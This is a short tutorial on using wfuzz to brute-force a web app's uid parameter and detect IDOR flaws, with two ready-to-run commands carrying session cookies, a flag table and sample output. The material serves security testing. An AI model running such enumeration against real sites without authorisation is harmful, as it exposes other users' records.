
# Using Wfuzz to Detect IDOR Vulnerabilities

## 🔍 Command

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt \
      --hc 404 --hh 2873 \
      -H "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64" \
      http://target:80/user/?uid=FUZZ
```

```shell
wfuzz -c -z file,/usr/share/SecLists/Fuzzing/uid_range_15990_32000.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=df1ff45401a6cc7e027d55d7a66587bb" http://idor-sandbox:80/user/?uid=FUZZ
```

---

## 📘 Explanation

| Component | Meaning |
|----------|---------|
| `wfuzz` | Web fuzzer tool used for security testing. |
| `-c` | Enables colored output. |
| `-z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt` | Loads a wordlist with all 5-digit numbers (00000–99999) for brute-forcing UID values. |
| `--hc 404` | Hides responses with HTTP status code 404 (Not Found). |
| `--hh 2873` | Hides responses that are exactly 2873 bytes long (likely default/error pages). |
| `-H "Cookie: PHPSESSID=..."` | Sends a session cookie to simulate an authenticated user. |
| `http://idor-sandbox:80/user/?uid=FUZZ` | Target URL where `FUZZ` is replaced with each wordlist entry. |

---

## 🎯 Purpose

This command attempts to brute-force the `uid` parameter to discover accessible user records. It filters out known errors and generic responses, helping to detect possible **Insecure Direct Object Reference (IDOR)** vulnerabilities.

---

## 📌 Sample Output

```text
000045:  C=200  L=1453  W=90  Ch=6900  "00045"
000089:  C=200  L=1520  W=88  Ch=7200  "00089"
```

A different length/content indicates the UID might be valid and accessible—possibly exposing unauthorized data.

---

## 🛡️ Tip

Always perform this kind of testing ethically and with permission. It is a powerful method for discovering IDOR flaws but must be handled responsibly.

---

## 📚 References

- [Wfuzz Documentation](https://wfuzz.readthedocs.io/)
- [OWASP: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
